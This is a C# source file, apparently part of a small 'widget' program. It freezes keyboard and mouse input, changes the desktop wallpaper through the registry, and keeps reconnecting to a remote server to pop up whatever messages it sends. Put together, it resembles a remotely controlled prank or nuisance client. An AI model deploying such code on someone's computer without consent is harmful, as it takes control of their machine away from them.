using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WidjetSobaka
{
    public partial class NativeMethods
    {
        [DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        public static void BlockInput(TimeSpan span)
        {
            try
            {
                NativeMethods.BlockInput(true);                       
                Thread.Sleep(span);
            }
            finally
            {
                NativeMethods.BlockInput(false);
            }
        }

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo
            (int uAction, int uParam, string lpvParam, int fuWinIni);
        public enum Style : int
        {
            Tiled,
            Centered,
            Stretched
        }
        public static void SetWallpaper(string path, Style style, int tile)
        {
            UserPreferenceChangedEventArgs user = new UserPreferenceChangedEventArgs(UserPreferenceCategory.Desktop);
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);

            key.SetValue("WallpaperStyle", style.ToString());
            key.SetValue("TileWallpaper", tile.ToString());

            if (File.Exists(path))
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        public static async void ConnectingToServer()
        {
            TcpClient tcpClient = new TcpClient();
            NetworkStream netSream;

            while (true)
            {
                while (true)
                    try
                    {
                        await tcpClient.ConnectAsync(Form1.serverAddress, Form1.serverPort);
                        netSream = tcpClient.GetStream();
                        break;
                    }
                    catch { }

                while (true)
                {
                    try
                    {
                        byte[] data = new byte[512];
                        if (!tcpClient.Connected) break;
                        string message = "";

                        do
                        {
                            int bytes = await netSream.ReadAsync(data, 0, data.Length); // получаем количество считанных байтов
                            message += Encoding.UTF8.GetString(data, 0, bytes);
                        } while (netSream.DataAvailable);

                        if (message != null && message != "")
                            MessageBox.Show(message);

                        await Task.Delay(100);

                    }
                    catch { }
                }
            }
        }
    }

}
